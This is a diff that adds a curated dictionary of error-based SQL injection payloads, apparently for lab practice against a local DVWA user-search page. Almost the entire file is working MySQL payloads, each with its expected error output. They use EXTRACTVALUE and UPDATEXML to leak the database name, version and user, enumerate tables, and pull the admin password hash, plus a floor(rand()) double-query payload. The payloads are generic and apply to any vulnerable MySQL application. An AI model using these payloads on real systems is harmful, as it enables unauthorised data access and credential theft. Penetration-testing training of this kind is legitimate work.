@@ -1,0 +1,44 @@
+# ==============================================================================
+# Error-Based SQL Injection Payloads — Curated Dictionary
+# Target Scope: Local DVWA User Search (127.0.0.1:8080/vulnerabilities/sqli/)
+# ==============================================================================
+
+# Context: Forcing generic MySQL syntax error to confirm database error rendering is enabled.
+# Expected Result: Returns MySQL syntax error message: "You have an error in your SQL syntax...".
+1'
+
+# Context: Double quote injection error test.
+# Expected Result: Breaks query if parameter is enclosed in double quotes.
+1"
+
+# Context: Unbalanced parenthesis error test.
+# Expected Result: Triggers query parsing syntax error due to unmatched parenthesis.
+1')
+
+# Context: ExtractValue() XML function with invalid XPATH syntax error.
+# Expected Result: Throws "XPATH syntax error: '~[database()]~'" echoing the database name.
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, database(), 0x7e)) #
+
+# Context: ExtractValue() database version extraction.
+# Expected Result: Throws XPATH syntax error containing MySQL version string (e.g. '~8.0.36~').
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e)) #
+
+# Context: UpdateXML() XML function with invalid replacement path.
+# Expected Result: Throws "XPATH syntax error: '~[user()]~'" echoing current database user.
+1' AND UPDATEXML(1, CONCAT(0x7e, user(), 0x7e), 1) #
+
+# Context: UpdateXML() table enumeration via subquery.
+# Expected Result: Throws syntax error containing first table name in current schema.
+1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1), 0x7e), 1) #
+
+# Context: UpdateXML() password hash extraction.
+# Expected Result: Throws syntax error containing admin password hash from users table.
+1' AND UPDATEXML(1, CONCAT(0x7e, (SELECT password FROM users WHERE user='admin' LIMIT 1), 0x7e), 1) #
+
+# Context: Integer overflow / division by zero error trigger.
+# Expected Result: Triggers math error or division by zero warning in query executor.
+1' AND 1/(SELECT 0) #
+
+# Context: Floor(rand()*2) group by key duplication error (Classic Double Query Injection).
+# Expected Result: Throws "Duplicate entry '[version]-1' for key 'group_key'".
+1' AND (SELECT 1 FROM (SELECT count(*), CONCAT(version(), 0x3a, floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x) a) #
